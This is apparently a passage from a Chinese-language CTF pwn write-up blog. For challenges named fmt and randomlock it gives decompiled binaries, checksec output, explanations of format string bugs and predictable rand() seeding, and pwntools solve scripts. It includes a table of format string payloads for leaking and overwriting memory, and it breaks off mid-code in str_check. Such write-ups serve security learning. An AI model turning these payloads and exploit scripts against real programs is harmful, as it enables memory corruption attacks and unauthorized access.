<h3 id="脚本解析-2"><a href="#脚本解析-2" class="headerlink" title="脚本解析"></a>脚本解析</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *                                   </span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>) </span><br><span class="line"></span><br><span class="line">target = connect(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">45691</span>)     </span><br><span class="line">target.recvuntil(<span class="string">b&quot;hint.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取程序泄露的8字节栈数据</span></span><br><span class="line">leaked_data = target.recv(<span class="number">8</span>)</span><br><span class="line">log.success(<span class="string">f&quot;Leaked data: <span class="subst">&#123;leaked_data.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将泄露的小端序数据转换为整数</span></span><br><span class="line">leaked_value = u64(leaked_data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送原始泄露值</span></span><br><span class="line">target.sendline(<span class="built_in">str</span>(leaked_value).encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收后续输出（包含换行符和提示）</span></span><br><span class="line">target.recvline() </span><br><span class="line">target.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h2><p><strong>IDA分析：</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *s2_1; <span class="comment">// [rsp+8h] [rbp-88h]</span></span><br><span class="line">    <span class="type">char</span> s1[<span class="number">16</span>]; <span class="comment">// [rsp+10h] [rbp-80h] BYREF</span></span><br><span class="line">    <span class="type">char</span> s2[<span class="number">16</span>]; <span class="comment">// [rsp+20h] [rbp-70h] BYREF</span></span><br><span class="line">    <span class="type">char</span> s[<span class="number">88</span>]; <span class="comment">// [rsp+30h] [rbp-60h] BYREF</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">    init(argc, argv, envp);</span><br><span class="line">    s2_1 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">    generate(s2, <span class="number">5LL</span>);</span><br><span class="line">    generate(s2_1, <span class="number">5LL</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hey there, little one, what&#x27;s your name?&quot;</span>);</span><br><span class="line">    fgets(s, <span class="number">80</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Nice to meet you,&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(s);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;I buried two treasures on the stack.Can you find them?&quot;</span>);</span><br><span class="line">    fgets(s1, <span class="number">8</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(s1, s2, <span class="number">5uLL</span>) )</span><br><span class="line">        lose();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Yeah,another one?&quot;</span>);</span><br><span class="line">    fgets(s1, <span class="number">8</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(s1, s2_1, <span class="number">5uLL</span>) )</span><br><span class="line">        lose();</span><br><span class="line">    win();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">win</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You got it!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>checksec分析：</strong></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec --file=./fmt</span></span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   53 Symbols        No    0               2               ./fmt</span><br></pre></td></tr></table></figure></div>

<p>本题的知识点在于<strong>格式化字符串漏洞</strong></p>
<h3 id="what-is-fmt"><a href="#what-is-fmt" class="headerlink" title="what is fmt?"></a><strong>what is fmt?</strong></h3><p>格式化字符串漏洞是一种严重的<strong>软件安全漏洞</strong>，主要出现在使用像 C&#x2F;C++ 这类允许直接内存访问且不进行边界检查的编程语言编写的程序中。当程序<strong>错误地将用户提供的数据直接作为格式化字符串参数传递给格式化输出函数</strong>（如 <code>**printf**</code>, <code>**sprintf**</code>, <code>**fprintf**</code>, <code>**syslog**</code> 等）时，该漏洞就会被利用。</p>
<h3 id="how-to-use-fmt"><a href="#how-to-use-fmt" class="headerlink" title="how to use fmt?"></a>how to use fmt?</h3><table>
<thead>
<tr>
<th><strong>利用类型</strong></th>
<th><strong>具体方法</strong></th>
<th><strong>格式字符串示例</strong></th>
<th><strong>作用说明</strong></th>
<th><strong>注意事项</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>信息泄露</strong></td>
<td>栈内容批量泄露</td>
<td><code>**%x %x %x %x**</code></td>
<td>连续输出栈上4个参数（十六进制格式）</td>
<td>输出长度不可控</td>
</tr>
<tr>
<td></td>
<td>指针格式泄露</td>
<td><code>**%p %p %p %p**</code></td>
<td>以指针格式输出栈上数据</td>
<td>更易读取地址</td>
</tr>
<tr>
<td></td>
<td>指定位置泄露</td>
<td><code>**%7$p**</code></td>
<td>直接读取栈上第7个参数的值</td>
<td>偏移量需调试确定</td>
</tr>
<tr>
<td></td>
<td>Canary泄露</td>
<td><code>**%23$p**</code></td>
<td>获取栈保护Canary值</td>
<td>需定位精确偏移</td>
</tr>
<tr>
<td></td>
<td>libc基址泄露</td>
<td><code>**%9$s**</code><br> + <code>**p32(puts@got)**</code></td>
<td>通过GOT表泄露函数地址计算libc基址</td>
<td>需已知GOT表地址</td>
</tr>
<tr>
<td></td>
<td>任意地址读取</td>
<td><code>**&quot;\x50\xa0\x04\x08%6$s&quot;**</code></td>
<td>读取0x0804a050地址内容</td>
<td>地址需对齐</td>
</tr>
<tr>
<td><strong>内存篡改</strong></td>
<td>基础写操作</td>
<td><code>**AAAA%6$n**</code></td>
<td>向指定地址写入数字4</td>
<td>写入值较小</td>
</tr>
<tr>
<td></td>
<td>控制写入值</td>
<td><code>**%100c%6$n**</code></td>
<td>输出100字符后向地址写入100</td>
<td>可能产生大量输出</td>
</tr>
<tr>
<td></td>
<td>双字节写入</td>
<td><code>**%1234x%6$hn**</code></td>
<td>向地址写入1234（低16位）</td>
<td>使用%hn格式符</td>
</tr>
<tr>
<td></td>
<td>单字节写入</td>
<td><code>**%90x%6$hhn**</code></td>
<td>向地址写入90（低8位）</td>
<td>最精确控制</td>
</tr>
<tr>
<td></td>
<td>多地址写入</td>
<td><code>**addr1+addr2+&quot;%10x%6$n%20x%7$n&quot;**</code></td>
<td>同时向两个地址写入不同值</td>
<td></td>
</tr>
</tbody></table>
<h3 id="脚本解析-3"><a href="#脚本解析-3" class="headerlink" title="脚本解析"></a>脚本解析</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">SEP = <span class="string">b&#x27;|||||&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    host = <span class="string">&#x27;127.0.0.1&#x27;</span>  <span class="comment"># Replace with actual host</span></span><br><span class="line">    port = <span class="number">33883</span>         <span class="comment"># Replace with actual port</span></span><br><span class="line">    p = remote(host, port)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Hey there, little one, what&#x27;s your name?\n&quot;</span>)</span><br><span class="line">    payload = SEP + <span class="string">b&#x27;%7$s&#x27;</span> + SEP + <span class="string">b&#x27;%10$p&#x27;</span><span class="comment">#利用SEP划分</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    字符串的具体位置需要通过gdb调试获得</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line">    line = p.recvline()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> line.startswith(<span class="string">b&quot;Nice to meet you,&quot;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Unexpected response:&quot;</span>, line)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    data = line[<span class="built_in">len</span>(<span class="string">b&quot;Nice to meet you,&quot;</span>):]</span><br><span class="line">    parts = data.split(SEP)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(parts) &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Split failed:&quot;</span>, parts)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    heap_string = parts[<span class="number">1</span>]</span><br><span class="line">    stack_hex_str = parts[<span class="number">2</span>].strip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> stack_hex_str.startswith(<span class="string">b&#x27;0x&#x27;</span>):</span><br><span class="line">        stack_hex_str = stack_hex_str[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        stack_int = <span class="built_in">int</span>(stack_hex_str, <span class="number">16</span>)</span><br><span class="line">        stack_bytes = stack_int.to_bytes(<span class="number">8</span>, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        stack_treasure = stack_bytes[:<span class="number">5</span>]</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error converting stack treasure:&quot;</span>, e)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    heap_treasure = heap_string[:<span class="number">5</span>]</span><br><span class="line">    p.recvline()  <span class="comment"># Skip the next line</span></span><br><span class="line"></span><br><span class="line">    p.send(stack_treasure + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Yeah,another one?\n&quot;</span>)</span><br><span class="line">    p.send(heap_treasure + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="randomlock"><a href="#randomlock" class="headerlink" title="randomlock"></a>randomlock</h2><p><strong>IDA分析：</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __fastcall main(<span class="built_in">int</span> argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> v4; // [rsp+Ch] [rbp-14h] BYREF</span><br><span class="line">  <span class="built_in">int</span> i; // [rsp+10h] [rbp-10h]</span><br><span class="line">  <span class="built_in">int</span> v6; // [rsp+14h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v7; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(0x28u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  initseed();</span><br><span class="line">  srand(seed);</span><br><span class="line">  puts(<span class="string">&quot;My lock looks strange—can you help me?&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">10</span> &amp;&amp; !flag; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(<span class="string">&quot;password %d\n&gt;&quot;</span>, i);</span><br><span class="line">    v6 = rand() % <span class="number">10000</span>;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">    <span class="keyword">if</span> ( v6 != v4 )</span><br><span class="line">      lose();</span><br><span class="line">  &#125;</span><br><span class="line">  win();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 initseed()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; // rax</span><br><span class="line">  <span class="built_in">int</span> i; // [rsp+8h] [rbp-8h]</span><br><span class="line">  <span class="built_in">int</span> fd; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  fd = <span class="built_in">open</span>(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>, 0LL);</span><br><span class="line">  <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(<span class="string">&quot;urandom&quot;</span>);</span><br><span class="line">    exit(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  read(fd, &amp;seed, 3uLL);</span><br><span class="line">  close(fd);</span><br><span class="line">  seed = seed % <span class="number">0x64</span> + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">120</span>; ++i )</span><br><span class="line">    change();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = seed &amp; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (seed &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    change();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 change()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; // rax</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (seed &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">3</span> * seed + <span class="number">1</span>;</span><br><span class="line">    seed = <span class="number">3</span> * seed + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = seed &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    seed &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>checksec分析：</strong></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec --file=./random</span></span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   57 Symbols        No    0               3               ./random</span><br></pre></td></tr></table></figure></div>

<p>题目考点在于<strong>伪随机数</strong></p>
<h3 id="what-is-Pseudorandomness？"><a href="#what-is-Pseudorandomness？" class="headerlink" title="what is Pseudorandomness？"></a>what is Pseudorandomness？</h3><p><strong>伪随机性</strong>（英语：Pseudorandomness）是一个过程似乎是随机的，但实际上并不是。例如<strong>伪随机数</strong>是使用一个确定性的算法计算出来的似乎是随机的数序，因此伪随机数实际上并不随机。在计算伪随机数时假如使用的开始值不变的话，那么伪随机数的数序也不变。伪随机数的随机性可以用它的统计特性来衡量，其主要特征是每个数出现的可能性和它出现时与数序中其它数的关系。伪随机数的优点是它的计算比较简单，而且只使用少数数值很难推算出计算它的算法。一般人们使用一个假的随机数，比如电脑上的时间作为计算伪随机数的开始值。</p>
<h3 id="how-to-use-Pseudorandomness？"><a href="#how-to-use-Pseudorandomness？" class="headerlink" title="how to use Pseudorandomness？"></a>how to use Pseudorandomness？</h3><p>在C语言中，伪随机数通过标准库函数<code>**rand()**</code>和<code>**srand()**</code>实现：</p>
<p><strong>初始化种子 (srand)</strong></p>
<ol>
<li><code>void srand(unsigned int seed);</code></li>
</ol>
<ul>
<li>设置随机数生成器的起始点</li>
<li>相同种子 ⇒ 相同随机数序列</li>
</ul>
<p>常用初始化方法：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">srand(time(<span class="literal">NULL</span>));  <span class="comment">// 使用当前时间作为种子</span></span><br><span class="line">srand(getpid());     <span class="comment">// 使用进程ID作为种子</span></span><br></pre></td></tr></table></figure></div>

<p><strong>生成随机数 (rand)</strong></p>
<ol start="2">
<li><code>int rand(void);</code></li>
</ol>
<ul>
<li>返回范围：0 ~ RAND_MAX（通常为32767）</li>
</ul>
<p>生成特定范围的随机数：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> dice = rand() % <span class="number">6</span> + <span class="number">1</span>;    <span class="comment">// 1-6的随机数</span></span><br><span class="line"><span class="type">int</span> percentage = rand() % <span class="number">100</span>; <span class="comment">// 0-99的随机数</span></span><br></pre></td></tr></table></figure></div>

<p><strong>典型使用模式</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    srand(time(<span class="literal">NULL</span>));  <span class="comment">// 基于时间初始化种子</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Random number %d: %d\n&quot;</span>, i+<span class="number">1</span>, rand());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>由上面的分析可以得到，如果srand()初始化的种子确定，那么随机数就确定，这就给利用伪随机数提供了条件</p>
<h3 id="脚本解析-4"><a href="#脚本解析-4" class="headerlink" title="脚本解析"></a>脚本解析</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span>  <span class="comment"># 减少输出噪音</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_password_sequence</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;使用系统libc的rand函数生成密码序列&quot;&quot;&quot;</span></span><br><span class="line">    libc = ctypes.CDLL(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">    libc.srand(<span class="number">1</span>)  <span class="comment"># 最终种子总是1</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    我们可以分析initseed()函数</span></span><br><span class="line"><span class="string">    在函数initseed()函数内，首先使用/dev/urandom获取真随机数作为种子</span></span><br><span class="line"><span class="string">    然后将种子取模，限制在 1~100 之间</span></span><br><span class="line"><span class="string">    然后通过change()函数进行可预测变换</span></span><br><span class="line"><span class="string">    可以证明这些种子的结果必收敛到1</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">str</span>(libc.rand() % <span class="number">10000</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    <span class="comment"># 生成密码序列</span></span><br><span class="line">    password_sequence = generate_password_sequence()</span><br><span class="line">    <span class="built_in">print</span>(password_sequence)</span><br><span class="line">    r = process(<span class="string">&#x27;./random&#x27;</span>)    <span class="comment"># 本地测试</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 接收初始消息</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27; you help me?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">11</span>):</span><br><span class="line">        <span class="comment"># 接收密码提示</span></span><br><span class="line">        prompt = <span class="string">f&quot;password <span class="subst">&#123;i&#125;</span>\n&gt;&quot;</span>.encode()</span><br><span class="line">        r.recvuntil(prompt)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 发送当前密码</span></span><br><span class="line">        password = password_sequence[i-<span class="number">1</span>]</span><br><span class="line">        r.sendline(password.encode())</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    <span class="comment"># 获取最终结果</span></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exploit()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="str-check"><a href="#str-check" class="headerlink" title="str_check"></a>str_check</h2><p><strong>IDA分析：</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> dest[<span class="number">24</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">    <span class="type">size_t</span> n; <span class="comment">// [rsp+18h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">    init(argc, argv, envp);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;What can u say?&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%255s&quot;</span>, str);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;So,what size is it?&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%zu&quot;</span>, &amp;n);</span><br><span class="line">    len = <span 